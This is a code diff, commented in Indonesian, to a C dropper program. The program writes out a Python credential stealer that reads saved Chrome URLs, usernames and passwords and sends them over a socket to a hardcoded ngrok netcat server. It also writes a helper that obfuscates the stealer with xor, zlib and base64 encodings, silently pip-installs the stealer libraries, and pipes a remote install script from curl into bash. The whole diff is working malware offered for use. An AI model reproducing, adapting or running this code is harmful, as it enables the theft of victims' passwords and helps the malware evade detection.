@@ -34,6 +34,181 @@ int check() {
     }
 }
 
+
+void generator(const char *f1, const char *f2, const char *f3) {
+    const char *notif = 
+        "import socket\n"
+        "import sys\n"
+        "\n"
+        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+        "\n"
+        "if len(sys.argv) != 4:\n"
+        "    print(\"Penggunaan:  \\npython3 notif.py [server] [port] [pesan]\")\n"
+        "    sys.exit(1)\n"
+        "else:\n"
+        "    try:\n"
+        "        server = sys.argv[1]\n"
+        "        port = int(sys.argv[2])\n"
+        "        pesan = sys.argv[3]\n"
+        "        \n"
+        "        s.connect((server, port))\n"
+        "        s.send(pesan.encode())\n"
+        "        s.close()\n"
+        "    except ConnectionRefusedError:\n"
+        "        print(\"Server penerima belum dihidupkan\\n\")\n";
+
+    const char *oliner =
+        "import os\n"
+        "import sys\n"
+        "import glob\n"
+        "from io import StringIO\n"
+        "\n"
+        "original_stdout = sys.stdout\n"
+        "sys.stdout = StringIO()\n"
+        "from PyOneLiner import OneLiner\n"
+        "sys.stdout = original_stdout\n"
+        "\n"
+        "md = [\"xor\", \"ascii85\", \"zlib\", \"base64\", \"binary\", \"base16\", \"base32\", \"base85\", \"unicode\"]\n"
+        "\n"
+        "def Oliner(mode, stealer):\n"
+        "    oneliner = OneLiner(stealer, type_=\"python\")\n"
+        "    if mode == md[0]:\n"
+        "        oneliner.xor()\n"
+        "    elif mode == md[1]:\n"
+        "        oneliner.ascii85()\n"
+        "    elif mode == md[2]:\n"
+        "        oneliner.zlib()\n"
+        "    elif mode == md[3]:\n"
+        "        oneliner.base64()\n"
+        "    elif mode == md[4]:\n"
+        "        oneliner.binary()\n"
+        "    elif mode == md[5]:\n"
+        "        oneliner.base16()\n"
+        "    elif mode == md[6]:\n"
+        "        oneliner.base32()\n"
+        "    elif mode == md[7]:\n"
+        "        oneliner.base85()\n"
+        "    elif mode == md[8]:\n"
+        "        oneliner.unicode()\n"
+        "    return oneliner.done()\n"
+        "\n"
+        "def gen(out, txt):\n"
+        "    with open(out, \"w\") as file:\n"
+        "        file.write(txt)\n"
+        "\n"        
+        "def delpayload():\n"
+        "    files = glob.glob(\"*payload*\")\n"
+        "    for file in files:\n"
+        "        os.remove(file)\n"
+        "    f2 = glob.glob(\"*.py\")\n"
+        "    for file2 in f2:\n"
+        "        os.remove(file2)\n"
+        "    return \"\\nSemua file payload berhasil dihapus\\n\"\n"
+        "\n"        
+        "def help():\n"
+        "    print(len(sys.argv))\n"
+        "    print(\"\"\"Info:\n"
+        "mode - [ xor | ascii85 | zlib | base64 | binary | base16 | base32 | base85 | unicode ]\n"
+        "stealer - [program stealer]\n"
+        "output - [output oneliner]\n"
+        "server - [ip server netcat]\n"
+        "port - [port server netcat]\n"
+        "\n"
+        "Penggunaan: python oliner.py [server] [port] [mode] [stealer] [output]\\n\"\"\")\n"
+        "\n"    
+        "if len(sys.argv) < 7:\n"
+        "    if len(sys.argv) == 2 and (sys.argv[1] == \"-h\" or sys.argv[1] == \"--help\"):\n"
+        "        help()\n"
+        "    elif len(sys.argv) == 2 and (sys.argv[1] == \"-d\" or sys.argv[1] == \"--delete\"):\n"
+        "        print(delpayload())\n"
+        "    elif len(sys.argv) == 6:\n"
+        "        server = sys.argv[1]\n"
+        "        port = sys.argv[2]\n"
+        "        m = sys.argv[3]\n"
+        "        s = sys.argv[4]\n"
+        "        o = sys.argv[5]\n"
+        "\n"        
+        "        if m in md:\n"
+        "            text = Oliner(m, s)\n"
+        "            if os.path.exists(o):\n"
+        "                os.remove(o)\n"
+        "                print(f\"\\nFile {o} sudah ada dan berhasil dihapus\\nMohon jalankan ulang script ini\\n\")\n"
+        "\n"            
+        "            gen(o, text)\n"
+        "\n"            
+        "            if os.path.exists(o):\n"
+        "                print(f\"File {o} berhasil dibuat dengan mode {m}\")\n"
+        "            else:\n"
+        "                print(f\"File {o} gagal dibuat dengan mode {m}\\n\")\n"
+        "        else:\n"
+        "            print(f\"\\nMode {m} tidak ditemukan\\nSilahkan gunakan mode yang tersedia\\npython oliner.py -h\\natau\\npython oliner.py --help\\n\")\n"
+        "    else:\n"
+        "        help()\n"
+        "else:\n"
+        "    help()\n";
+    
+    const char *bahan =
+        "from ChromePasswordsStealer import ChromePasswordsStealer\n"
+        "import socket\n"
+        "import sys\n"
+        "from io import StringIO\n"
+        "\n"
+        "original_stdout = sys.stdout\n"
+        "sys.stdout = StringIO()\n"
+        "sys.stdout = original_stdout\n"
+        "\n"
+        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+        "\n"
+        "if len(sys.argv) != 3:\n"
+        "   print(\"Penggunaan:  \\npython3 bahan.py [server] [port]\")\n"
+        "   sys.exit(1)\n"
+        "else:\n"
+        "   server = sys.argv[1]\n"
+        "   port = int(sys.argv[2])\n"
+        "   try:\n"
+        "       s.connect((server, port))\n"
+        "       do = ChromePasswordsStealer(\"passwords\", True)\n"
+        "       do.get_database_cursor()\n"
+        "       do.get_key()\n"
+        "\n"
+        "       for url, username, password in do.get_credentials():\n"
+        "           data = f\"{url}, {username}, {password}\\n\"\n"
+        "           s.send(data.encode())\n"
+        "\n"
+        "       s.close()\n"
+        "    except ConnectionRefusedError:\n"
+        "        print(\"Server penerima belum dihidupkan\\n\")\n";
+
+    FILE *fp1;
+    FILE *fp2;
+    FILE *fp3;
+
+    fp1 = fopen(f1, "w");
+    if (fp1 == NULL) {
+        perror("Gagal membuka file");
+    }
+    fprintf(fp1, "%s", notif);
+    fclose(fp1);
+    
+    fp2 = fopen(f2, "w");
+    if (fp2 == NULL) {
+        perror("Gagal membuka file");
+    }
+    fprintf(fp2, "%s", oliner);
+    fclose(fp2);
+    
+    fp3 = fopen(f3, "w");
+    if (fp3 == NULL) {
+        perror("Gagal membuka file");
+    }
+    fprintf(fp3, "%s", bahan);
+    fclose(fp3);
+    
+    char status[150];
+    snprintf(status, sizeof(status), "File %s, %s, %s berhasil dibuat.\n", f1, f2, f3);
+    printf("%s\n", status);
+}
+
 char* readFile(const char *filename) {
     FILE *file = fopen(filename, "r");
     if (!file) {
@@ -105,8 +280,6 @@ void run(const char *s, const int p, const char *pload) {
         return;
     }
 
-    // printf(text);
-
     size_t contentLength = strlen(text);
     char *content = (char*)malloc(contentLength * 2 + 1);
     if (!content) {
@@ -160,7 +333,7 @@ void generate(Payload *payloads, int numModes, int numPayloads, const char *s, c
 void install(const char *s, const int p) {
     printf("Install modul\n");
     char command[150];
-    snprintf(command, sizeof(command), "python.exe -m pip install -r req.txt");
+    snprintf(command, sizeof(command), "python.exe -m pip install PyOneLiner ChromePasswordsStealer");
     system(command);
     sleep(1);
 }
@@ -180,44 +353,6 @@ void os(const char *s, const int p) {
     #elif __linux__
         system("/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"");
         system("brew install python");
-    #elif __APPLE__
-        FILE *fp;
-        char result[128];
-        fp = popen("which apt", "r");
-        if (fp == NULL) {
-            notif(s, p, "Gagal-cek-apt\n");
-            return;
-        }
-        if (fgets(result, sizeof(result), fp) != NULL) {
-            system("sudo apt update && sudo apt install -y python3");
-            pclose(fp);
-            return;
-        }
-        pclose(fp);
-
-        fp = popen("which yum", "r");
-    if (fp == NULL) {
-        notif(s, p, "Gagal-cek-yum\n");
-        return;
-    }
-    if (fgets(result, sizeof(result), fp) != NULL) {
-        system("sudo yum install -y python3");
-        pclose(fp);
-        return;
-    }
-    pclose(fp);
-
-    fp = popen("which pacman", "r");
-    if (fp == NULL) {
-        notif(s, p, "Gagal-cek-pacman\n");
-        return;
-    }
-    if (fgets(result, sizeof(result), fp) != NULL) {
-        system("sudo pacman -Sy python");
-        pclose(fp);
-        return;
-    }
-    pclose(fp);
     #else
         notif(s, p, "Jenis-sistem-operasi-tidak-ditemukan\n");
     #endif
@@ -229,10 +364,13 @@ int main() {
     const char *server = "0.tcp.ap.ngrok.io"; // Silahkan sesuaikan dengan alamat server netcat yang diinginkan
     const int port = 8888; // Silahkan sesuaikan dengan port server netcat yang diinginkan
     const char *ploadd = "iniPAYLOADnya.py";
+    const char *gen1 = "notif.py";
+    const char *gen2 = "oliner.py";
+    const char *gen3 = "bahan.py";
 
     if (ping(server)) {
         if (python) {
-            delete();
+            generator(gen1, gen2, gen3);
             signal(SIGINT, handler);
 
             Payload payloads[] = {
